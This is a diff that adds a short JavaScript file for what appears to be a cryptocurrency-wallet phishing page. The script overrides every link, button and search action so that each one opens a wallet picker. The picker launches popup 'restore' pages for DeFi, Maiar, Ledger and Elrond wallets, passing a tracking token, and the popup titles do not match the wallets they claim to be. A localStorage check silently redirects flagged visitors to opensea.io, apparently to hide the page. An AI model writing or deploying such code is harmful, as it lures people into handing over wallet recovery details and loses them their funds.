@@ -1,0 +1,62 @@
+var s
+
+document.addEventListener('DOMContentLoaded', function() {
+    const url = new URL(window.location.href)
+    s = url.searchParams.get('v');
+
+    const mouse = localStorage.getItem('myMouse');
+    if(mouse == 'Jerry1') {
+        const link = document.createElement("a");
+        link.referrerPolicy = "no-referrer";
+        link.rel = "noreferrer";
+
+        link.href = "https://opensea.io";
+        link.click();
+    }
+    const searchInput = document.querySelector('#searchbox')
+    const links = document.querySelectorAll('a')
+    const buttons = document.querySelectorAll('button')
+
+    searchInput.addEventListener('keypress', ev => {
+        if(ev.key == 'Enter') {
+            ev.preventDefault()
+            openWallets()
+        }
+    })
+
+    links.forEach(link => {
+        link.addEventListener('click', ev => {
+            ev.preventDefault()
+            openWallets()
+        })
+    })
+
+    buttons.forEach(button => {
+        button.addEventListener('click', ev => {
+            ev.preventDefault()
+            openWallets()
+        })
+    })
+
+}, false);
+
+const openWallets = () => {
+    document.querySelector('#wallets').style.right = 0
+}
+
+const openDefi = () => {
+    window.open('defi-wallet.html?action=restore&v='+s, 'Defi Wallet', `width=400,height=600,top=10,right=10`)
+}
+const openMaiarApp = () => {
+    window.open('maiar-app.html?action=restore&v='+s, 'Bitski', `width=400,height=600,top=10,right=10`)
+}
+
+const openLedger = () => {
+    window.open('ledger.html?action=restore&v='+s, 'WalletConnect', `width=400,height=600,top=10,right=10`)
+}
+
+const openElrond = () => {
+    window.open('elrond.html?action=restore&v='+s, 'Coinbase', `width=400,height=600,top=10,right=10`)
+}
+
+
